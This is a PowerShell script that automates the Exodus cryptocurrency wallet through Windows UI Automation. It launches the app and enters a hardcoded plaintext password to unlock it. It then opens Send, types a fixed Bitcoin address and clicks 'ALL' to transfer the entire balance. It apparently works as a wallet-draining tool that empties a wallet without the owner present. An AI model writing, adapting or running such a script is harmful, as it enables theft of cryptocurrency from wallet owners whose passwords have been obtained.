Add-Type -AssemblyName UIAutomationClient

function Wait-ForWindow {
    param([string]$pattern,[int]$timeout=40)
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $end=(Get-Date).AddSeconds($timeout)
    while((Get-Date)-lt $end){
        $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
            [System.Windows.Automation.Condition]::TrueCondition)
        foreach($w in $wins){
            if($w.Current.Name -match $pattern){ return $w }
        }
        Start-Sleep -Milliseconds 300
    }
    return $null
}

function RefreshExodusWindow {
    Write-Host "[INFO] Refreshing Exodus window reference..."
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
        [System.Windows.Automation.Condition]::TrueCondition)
    foreach($w in $wins){
        if($w.Current.Name -match "EXODUS"){
            Write-Host "[INFO] ✅ Refreshed main Exodus window found: $($w.Current.Name)"
            return $w
        }
    }
    Write-Host "[WARN] Could not refresh Exodus window."
    return $null
}

function ClickElementByName {
    param($win,[string]$name)

    # sanity check
    if(-not $win -or -not ($win -is [System.Windows.Automation.AutomationElement])){
        Write-Host "[ERR] Invalid window object passed to ClickElementByName"
        return $false
    }

    $cond=New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty,$name
    )
    $el=$win.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$cond)
    if($el){
        try {
            $el.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
            Write-Host "[INFO] ✅ Clicked '$name'"
            return $true
        } catch {
            Write-Host "[WARN] Found '$name' but couldn’t click."
            return $false
        }
    } else {
        Write-Host "[WARN] '$name' not found."
        return $false
    }
}

function TypeBTC {
    param([string]$btcAddr)
    $wshell = New-Object -ComObject WScript.Shell
    Start-Sleep -Milliseconds 200
    $wshell.SendKeys($btcAddr)
    Write-Host "[INFO] Typed BTC address: $btcAddr"
}

function ClickAllButton {
    param($mainWin)
    if(-not $mainWin -or -not ($mainWin -is [System.Windows.Automation.AutomationElement])){
        Write-Host "[ERR] Invalid window for ClickAllButton"
        return
    }

    $cond = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty,"ALL"
    )
    $allElement = $mainWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$cond)
    if($allElement){
        try {
            $allElement.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
            Write-Host "[INFO] ✅ Clicked 'ALL' button!"
        } catch {
            Write-Host "[WARN] Found 'ALL' but fallback coords..."
            $bounds = $allElement.Current.BoundingRectangle
            $x = [int]($bounds.X + $bounds.Width/2)
            $y = [int]($bounds.Y + $bounds.Height/2)
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class MouseClicker {
                [DllImport("user32.dll",CharSet=CharSet.Auto,CallingConvention=CallingConvention.StdCall)]
                public static extern void mouse_event(long dwFlags,long dx,long dy,long cButtons,long dwExtraInfo);
                private const int MOUSEEVENTF_LEFTDOWN=0x02;
                private const int MOUSEEVENTF_LEFTUP=0x04;
                public static void LeftClick(int x,int y){
                    System.Windows.Forms.Cursor.Position=new System.Drawing.Point(x,y);
                    mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
                }
            }
"@ -ReferencedAssemblies System.Windows.Forms
            [MouseClicker]::LeftClick($x,$y)
            Write-Host "[INFO] ✅ Fallback clicked ALL at $x,$y"
        }
    } else {
        Write-Host "[WARN] Couldn’t find 'ALL' element."
    }
}

function Launch-Exodus {
    Write-Host "[INFO] Searching for Exodus.exe..."
    $exodusPath = Get-ChildItem "$env:LOCALAPPDATA\exodus" -Recurse -Include "Exodus.exe" -ErrorAction SilentlyContinue |
                  Select-Object -First 1 -ExpandProperty FullName
    if (-not $exodusPath) {
        $exodusPath = Get-ChildItem "$env:ProgramFiles","$env:ProgramFiles(x86)" -Recurse -Include "Exodus.exe" -ErrorAction SilentlyContinue |
                      Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $exodusPath) { Write-Host "[ERROR] Exodus.exe not found."; exit 1 }
    Write-Host "[INFO] Found Exodus at: $exodusPath"
    Start-Process -FilePath $exodusPath
}

function FillPasswordAndLogin {
    param($password)

    # wait for login UI
    Write-Host "[INFO] Waiting for login window..."
    $loginWin = Wait-ForWindow "Enter Password" 30
    if(-not $loginWin){ Write-Host "[ERR] Login window not found."; exit 1 }

    # find password field
    $editCond=New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ControlTypeProperty,
        [System.Windows.Automation.ControlType]::Edit
    )
    $pwdBox=$loginWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$editCond)
    if(-not $pwdBox){ Write-Host "[ERR] Password field not found."; exit 1 }
    $vp=$pwdBox.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern)
    $vp.SetValue($password)
    Write-Host "[INFO] Password filled."

    # press Enter
    $wshell=New-Object -ComObject WScript.Shell
    $wshell.AppActivate("Enter Password")
    Start-Sleep -Milliseconds 150
    $wshell.SendKeys("{ENTER}")
    Write-Host "[INFO] Pressed Enter to unlock."

    # wait for new main window
    Write-Host "[INFO] Waiting for Exodus main UI after login..."
    Start-Sleep -Seconds 3  # allow UI reload
    $mainWin = RefreshExodusWindow
    if(-not $mainWin){ Write-Host "[ERR] Couldn’t grab post-login window."; exit 1 }

    Write-Host "[INFO] ✅ Logged in, main window title: $($mainWin.Current.Name)"
    return $mainWin
}

function DoWalletSendFlow {
    param($mainWin,[string]$btcAddress)

    # ensure we refresh reference again before click
    $mainWin = RefreshExodusWindow

    # Click Wallet
    Write-Host "[INFO] Clicking Wallet..."
    $ok = ClickElementByName $mainWin "Wallet"
    if(-not $ok){ Write-Host "[ERR] Wallet not clickable"; return }

    Start-Sleep -Seconds 1.0

    # Click Send
    Write-Host "[INFO] Clicking Send..."
    $ok2 = ClickElementByName $mainWin "Send"
    if(-not $ok2){ Write-Host "[ERR] Send not clickable"; return }

    # Type BTC
    TypeBTC $btcAddress
    Start-Sleep -Milliseconds 200

    # Click ALL
    ClickAllButton $mainWin
}

# === MAIN ===
$exodusPassword = "!Mamoute901"
$btcAddress     = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

Launch-Exodus
$mainWin = FillPasswordAndLogin $exodusPassword
DoWalletSendFlow $mainWin $btcAddress
